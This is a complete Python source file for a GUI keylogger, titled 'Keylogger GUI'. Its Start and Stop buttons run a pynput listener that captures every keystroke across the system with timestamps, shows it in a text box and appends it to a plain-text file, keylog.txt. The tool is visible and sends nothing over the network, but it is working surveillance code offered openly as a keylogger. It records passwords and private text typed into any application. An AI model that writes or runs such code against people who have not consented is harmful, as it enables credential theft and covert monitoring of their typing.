import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
from datetime import datetime

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger GUI")
        self.root.geometry("500x300")
        
        self.log_display = scrolledtext.ScrolledText(self.root, width=60, height=15)
        self.log_display.pack(pady=10)
        
        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(side=tk.RIGHT, padx=10)
        
        self.listener = None
        self.is_logging = False

    def on_press(self, key):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            key_char = f"{timestamp} - {key.char}\n"
        except AttributeError:
            if key == key.space:
                key_char = f"{timestamp} - [SPACE]\n"
            elif key == key.enter:
                key_char = f"{timestamp} - [ENTER]\n"
            elif key == key.backspace:
                key_char = f"{timestamp} - [BACKSPACE]\n"
            else:
                key_char = f"{timestamp} - [{key}]\n"

        self.log_display.insert(tk.END, key_char)
        self.log_display.see(tk.END)
        
        with open("keylog.txt", "a") as log_file:
            log_file.write(key_char)

    def start_keylogger(self):
        if not self.is_logging:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.is_logging = True
            self.log_display.insert(tk.END, "Keylogger started...\n")
    
    def stop_keylogger(self):
        if self.is_logging and self.listener is not None:
            self.listener.stop()
            self.is_logging = False
            self.log_display.insert(tk.END, "Keylogger stopped.\n")
    
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
